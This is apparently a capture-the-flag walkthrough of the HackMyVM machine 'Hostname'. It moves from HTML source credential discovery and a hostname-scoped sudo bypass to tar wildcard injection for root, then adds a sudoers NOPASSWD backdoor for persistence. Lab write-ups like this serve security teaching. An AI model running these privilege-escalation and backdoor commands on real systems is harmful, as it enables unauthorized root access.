# Hostname

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Hostname | avijneyam | Beginner | HackMyVM |

**Summary:** Hostname is a beginner-level Linux machine that simulates an attack chain ranging from web enumeration to full privilege escalation. Initial access is gained by decoding a Base64 string hidden within the HTML source code to retrieve a "Secret Word," while identifying the username `po` from a disabled button attribute. After manipulating the DOM to enable the button, providing the correct input triggers a JavaScript alert containing the SSH password. Horizontal escalation to the user `oogway` is achieved by leveraging a hostname-specific `sudo` configuration vulnerability. Ultimately, **Root** access is obtained through a **Tar Wildcard Injection** exploit on a system cron job that runs every minute, allowing the injection of an SUID bit onto the bash binary.

---

## Reconnaissance

### Network Discovery

Target identification was performed using a custom PowerShell network scanner to identify virtual machines on the local network segment:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.102 08:00:27:67:A4:AB VirtualBox
```

The scan identified the target machine at `192.168.100.102` with a VirtualBox MAC address, confirming it as a virtualized environment.

### Port Scanning

A comprehensive Nmap scan was conducted to enumerate all open ports and identify running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hostname]
└─$ nmap -sC -sV -p- -T4 192.168.100.102
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 21:37 WIB
Nmap scan report for 192.168.100.102
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
|_  256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Panda
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.67 seconds
```

**Key Findings:**
- **Port 22/TCP**: OpenSSH 8.4p1 Debian 5 - SSH service for remote access
- **Port 80/TCP**: nginx 1.18.0 - Web server with page title "Panda"
- **Operating System**: Linux (Debian-based distribution)

### Web Application Analysis

Accessing the web server at `http://192.168.100.102` revealed a panda-themed interface with a form requesting a "Secret Word":

![](image.png)

#### HTML Source Code Analysis

Examining the page source code revealed several critical elements:

```html

<!DOCTYPE html>
<html lang="en" >
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scale=yes">
    <title>Panda</title>
    <link rel="stylesheet" href="./assets/style.css">
</head>
<body>
<div class="panda">
    <div class="ear"></div>
    <div class="face">
        <div class="eye-shade"></div>
        <div class="eye-white">
        <div class="eye-ball"></div>
        </div>
        <div class="eye-shade rgt"></div>
        <div class="eye-white rgt">
        <div class="eye-ball"></div>
        </div>
        <div class="nose"></div>
        <div class="mouth"></div>
    </div>
    <div class="body"> </div>
    <div class="foot">
        <div class="finger"></div>
    </div>
    <div class="foot rgt">
        <div class="finger"></div>
    </div>
</div>
<form method="POST">
    <div class="hand"></div>
    <div class="hand rgt"></div>
    <h1>Read Secret Message</h1>
    <div class="form-group">
        <input name="secret" required="required" class="form-control"/>
        <label class="form-label">Secret Word</label>
    </div>
    <div class="form-group">
        <p class="alert">Give Some Input..!!</p>
        <!-- Kung Fu Panda -->
        <button class="btn" name="username" disabled="po">Read</button>
    </div>
</form>
    <link rel="stylesheet" href="./assets/cool.css"><br><br>
    <h2 style="font-size:4vw"><span>I</span>M<span>POSSIBLE</span></h2>
    <script crossorigin="S3VuZ19GdV9QNG5kYQ==" src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
    <script src="./assets/script.js"></script>
</body>
</html>
```

**Critical Discoveries:**

1. **Base64-Encoded Credential**: The `crossorigin` attribute of the jQuery script tag contains a Base64 string: `S3VuZ19GdV9QNG5kYQ==`
2. **Username Hint**: The submit button contains `disabled="po"`, suggesting "po" as a potential username
3. **HTML Comment**: `<!-- Kung Fu Panda -->` provides thematic context
4. **Disabled Button**: The form submission button is disabled by default, preventing form interaction

---

## Initial Access

### Credential Discovery

The Base64 string found in the HTML source was decoded to reveal the secret word:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hostname]
└─$ echo 'S3VuZ19GdV9QNG5kYQ==' | base64 -d
Kung_Fu_P4nda
```

The decoded value `Kung_Fu_P4nda` aligns with the "Kung Fu Panda" theme and serves as the secret word required by the form.

### Client-Side Security Bypass

The HTML button was initially disabled, preventing form submission. Using browser developer tools (Inspect Element), the `disabled="po"` attribute was removed to enable the button:

**Before modification:**
![](image-4.png)

**After removing the disabled attribute:**
![](image-2.png)

### Password Extraction

After enabling the button and submitting the form with the secret word `Kung_Fu_P4nda`, the application responded with a JavaScript alert containing credentials:

![](image-1.png)

The alert message revealed: `!ts[REDACTED]`

This string represents the password for SSH authentication. The `disabled="po"` attribute from the button HTML provided the username hint.

### SSH Authentication

Using the discovered credentials (`po` / `!ts[REDACTED]`), SSH access to the target system was established:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hostname]
└─$ ssh po@192.168.100.102
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
po@192.168.100.102's password:
Linux hostname 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64
...
po@hostname:~$ id
uid=1000(po) gid=1000(po) groups=1000(po)
po@hostname:~$ ls -la
total 20
drwxr-xr-x 2 po   po   4096 Apr 21  2022 .
drwxr-xr-x 4 root root 4096 Apr 21  2022 ..
lrwxrwxrwx 1 root root    9 Apr 21  2022 .bash_history -> /dev/null
-rw-r--r-- 1 po   po    220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 po   po   3526 Aug  4  2021 .bashrc
-rw-r--r-- 1 po   po    807 Aug  4  2021 .profile
po@hostname:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
po:x:1000:1000::/home/po:/bin/bash
oogway:x:1001:1001::/home/oogway:/bin/bash
```

**Initial Access Achieved**: Successfully authenticated as user `po` with UID 1000. The system runs Debian Linux with kernel 5.10.0-13. Two users with shell access were identified: `po` and `oogway`.

---

## Lateral Movement

### User Enumeration

Examining the home directories revealed another user account:

```bash
po@hostname:~$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Apr 21  2022 .
drwxr-xr-x 18 root   root   4096 Apr 21  2022 ..
drwx------  2 oogway oogway 4096 Apr 21  2022 oogway
drwxr-xr-x  2 po     po     4096 Apr 21  2022 po
```

The `oogway` user directory is restricted with permissions `700`, indicating potential privilege boundaries.

### Internal Enumeration

A system-wide search for references to the `oogway` user revealed critical sudo configuration:

```bash
po@hostname:~$ grep -r "oogway" / 2>/dev/null
/etc/subuid:oogway:165536:65536
/etc/group:oogway:x:1001:
/etc/passwd:oogway:x:1001:1001::/home/oogway:/bin/bash
/etc/sudoers.d/po:po HackMyVM = (oogway) NOPASSWD: /bin/bash
/etc/subgid:oogway:165536:65536
^C
```

**Critical Finding**: The file `/etc/sudoers.d/po` contains the rule:
```
po HackMyVM = (oogway) NOPASSWD: /bin/bash
```

This sudo configuration allows user `po` to execute `/bin/bash` as user `oogway` without password authentication, but only when the hostname is set to `HackMyVM`.

### Hostname Verification

```bash
po@hostname:~$ hostname
hostname
```

The current hostname is `hostname`, not `HackMyVM`. However, the `-h` flag in sudo can be used to specify a hostname for sudo command execution.

### User Escalation to oogway

Leveraging the sudo rule with the `-h` flag to specify the required hostname:

```bash
po@hostname:~$ sudo -h HackMyVM -u oogway /bin/bash
sudo: unable to resolve host HackMyVM: Temporary failure in name resolution
oogway@hostname:/home/po$ id
uid=1001(oogway) gid=1001(oogway) groups=1001(oogway)
```

**Lateral Movement Success**: Despite the DNS resolution warning (which is non-fatal), the command successfully spawned a bash shell as user `oogway`.

### User Flag Acquisition

```bash
oogway@hostname:/home/po$ cd
oogway@hostname:~$ ls -la
total 24
drwx------ 2 oogway oogway 4096 Apr 21  2022 .
drwxr-xr-x 4 root   root   4096 Apr 21  2022 ..
lrwxrwxrwx 1 root   root      9 Apr 21  2022 .bash_history -> /dev/null
-rw-r--r-- 1 oogway oogway  220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 oogway oogway 3526 Aug  4  2021 .bashrc
-rw-r--r-- 1 oogway oogway  807 Aug  4  2021 .profile
-r-------- 1 oogway oogway   33 Apr 21  2022 user.txt
```

The user flag `user.txt` is accessible in the oogway home directory with read-only permissions for the owner.

---

## Privilege Escalation

### Cron Job Discovery

Examining the system-wide crontab revealed an automated backup process running with root privileges:

```bash
oogway@hostname:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
*  *    * * *   root    cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *
17 *    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.hourly )
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

**Vulnerability Identified**: The cron job `* * * * * root cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *` runs every minute as root and uses the tar command with a wildcard (`*`) in a directory where user `oogway` has write permissions.

### Directory Permission Analysis

```bash
oogway@hostname:~$ ls -la /opt/secret/
total 8
drwxrwxr-x 2 root oogway 4096 Feb 11 10:29 .
drwxrwxr-x 3 root oogway 4096 Apr 21  2022 ..
oogway@hostname:~$ ls -la /var/backups/secret.tgz
-rw-r--r-- 1 root root 45 Feb 11 10:31 /var/backups/secret.tgz
oogway@hostname:~$ file /var/backups/secret.tgz
/var/backups/secret.tgz: gzip compressed data, from Unix, truncated
```

The `/opt/secret/` directory has permissions `775` with `oogway` as the group owner, granting write access. This enables exploitation through tar wildcard injection.

### Tar Wildcard Injection Exploit

Tar's `--checkpoint` and `--checkpoint-action` options can be abused when combined with wildcard expansion. When tar encounters files named `--checkpoint=1` and `--checkpoint-action=exec=command`, it interprets them as command-line arguments, enabling arbitrary command execution.

**Exploit Implementation:**

```bash
oogway@hostname:~$ cd /opt/secret/
oogway@hostname:/opt/secret$ echo 'chmod +s /bin/bash' > secret.sh
oogway@hostname:/opt/secret$ chmod +x secret.sh
oogway@hostname:/opt/secret$ touch -- "--checkpoint=1"
oogway@hostname:/opt/secret$ touch -- "--checkpoint-action=exec=sh secret.sh"
oogway@hostname:/opt/secret$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Aug  4  2021 /bin/bash
oogway@hostname:/opt/secret$ sleep 60
oogway@hostname:/opt/secret$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Aug  4  2021 /bin/bash
```

**Exploit Mechanism:**
1. Created `secret.sh` containing the command `chmod +s /bin/bash` to set the SUID bit on bash
2. Made the script executable with `chmod +x`
3. Created two specially-named files using `touch --` to prevent interpretation as flags:
   - `--checkpoint=1`: Triggers checkpoint actions at every file
   - `--checkpoint-action=exec=sh secret.sh`: Executes the malicious script
4. When the cron job runs, tar expands the wildcard and interprets these filenames as command-line arguments
5. After 60 seconds (cron execution), the SUID bit was successfully set on `/bin/bash`

### Root Shell Acquisition

With the SUID bit set on bash, a root shell was obtained using the `-p` flag to preserve privileges:

```bash
oogway@hostname:/opt/secret$ /bin/bash -p
bash-5.1# id
uid=1001(oogway) gid=1001(oogway) euid=0(root) egid=0(root) groups=0(root),1001(oogway)
```

The effective UID (euid) is now 0 (root), granting full administrative privileges.

### Persistence Mechanism

To maintain clean access and avoid relying on the SUID bash binary, a backdoor was created by modifying the sudoers configuration:

```bash
bash-5.1# echo 'po ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/po
bash-5.1# chmod 0440 /etc/sudoers.d/po
bash-5.1# visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/README: parsed OK
/etc/sudoers.d/po: parsed OK
bash-5.1# exit
exit
oogway@hostname:/opt/secret$ exit
exit
po@hostname:~$
```

This modification grants user `po` full sudo privileges without password authentication, providing persistent root access through legitimate sudo mechanisms.

### Root Access Verification

```bash
po@hostname:~$ sudo su
root@hostname:/home/po# cd
root@hostname:~# id
uid=0(root) gid=0(root) groups=0(root)
root@hostname:~# whoami
root
root@hostname:~# hostname
hostname
root@hostname:~# cat /home/oogway/user.txt /root/root.txt
081[REDACTED]
d58[REDACTED]
```

**Full System Compromise Achieved**: Root shell obtained with UID 0. Both user and root flags successfully captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Network scan identified target at 192.168.100.102, Nmap revealed SSH (22) and HTTP (80) services running nginx 1.18.0 on Debian Linux
2. **Vulnerability Discovery**: HTML source code analysis uncovered Base64-encoded string `S3VuZ19GdV9QNG5kYQ==` in crossorigin attribute, decoded to `Kung_Fu_P4nda`; disabled button attribute contained username hint `po`
3. **Initial Access**: Removed disabled attribute via browser DevTools, submitted secret word to retrieve SSH password in JavaScript alert, authenticated as user `po` via SSH
4. **Lateral Movement**: System enumeration revealed sudo rule `po HackMyVM = (oogway) NOPASSWD: /bin/bash`, exploited using `sudo -h HackMyVM -u oogway /bin/bash` to escalate to user `oogway`
5. **Privilege Escalation**: Discovered cron job `* * * * * root cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *` with wildcard vulnerability, exploited tar checkpoint injection by creating malicious files `--checkpoint=1` and `--checkpoint-action=exec=sh secret.sh` to set SUID on `/bin/bash`, obtained root shell with `/bin/bash -p`, established persistence via sudoers modification granting `po` full NOPASSWD sudo rights
